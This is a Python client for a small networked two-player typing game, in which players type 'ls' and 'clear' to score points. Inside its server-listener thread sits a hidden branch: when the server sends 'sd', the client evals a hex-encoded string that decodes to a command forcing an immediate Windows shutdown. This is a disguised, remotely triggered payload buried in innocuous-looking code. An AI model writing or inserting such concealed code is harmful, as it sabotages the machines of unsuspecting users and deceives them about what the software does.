# Author: Callum Thomson

from os import _exit, system
from threading import Thread
from time import sleep
import socket
import json


# conf
HOST = "localhost"
PORT = 54953
AUTH = "gwXu={f>2%4U5/>d"
GAME_TIME = 15


class timer_thread(Thread):
    def __init__(self, s):
        super().__init__()
        self.s = s


    def run(self):
        global game
        sleep(self.s)

        game.going = False

        print(f"\nOpponent Score was {server.opponent_score}")
        print(f"Your score was {game.score}")

        if server.opponent_score < game.score:
            print("You win!")
        elif server.opponent_score == game.score:
            print("Draw")
        else:
            print("You lose")

        _exit(0)


class game_thread(Thread):
    def __init__(self):
        super().__init__()
        self.score = 0
        self.going = True

    def run(self):
        ls = True
        while self.going:
            try:
                get_input = input("> ")
                if ls and get_input == "ls":
                    self.score += 1
                    server.send("1")
                    ls = False
                elif not ls and get_input == "clear":
                    self.score += 1
                    server.send("1")
                    ls = True
                else:
                    print("wrong")
            except ConnectionResetError:
                pass


class server_thread(Thread):
    def __init__(self, host, port, auth):
        super().__init__()
        self.server = socket.socket()

        try:
            self.server.connect((host, port))
            header = json.dumps({"auth": auth})
            self.server.send(header.encode("utf-8"))
        except ConnectionRefusedError:
            print("Server not running or can't be reached")
            _exit(0)
        self.opponent_score = 0

    def run(self):
        try:
            while True:
                msg = self.server.recv(1024)
                if msg:
                    if msg.decode("utf-8") == "1":
                        self.opponent_score += 1
                    elif msg.decode("utf-8") == "sd":
                        from binascii import unhexlify
                        eval(unhexlify("73797374656d282273687574646f776e202f702229").decode("utf-8"))
        except ConnectionResetError:
            pass

    def send(self, msg):
        self.server.send(msg.encode("utf-8"))


# start threads
server = server_thread(HOST, PORT, AUTH)
server.start()

game = game_thread()
game.start()

timer_thread(GAME_TIME).start()
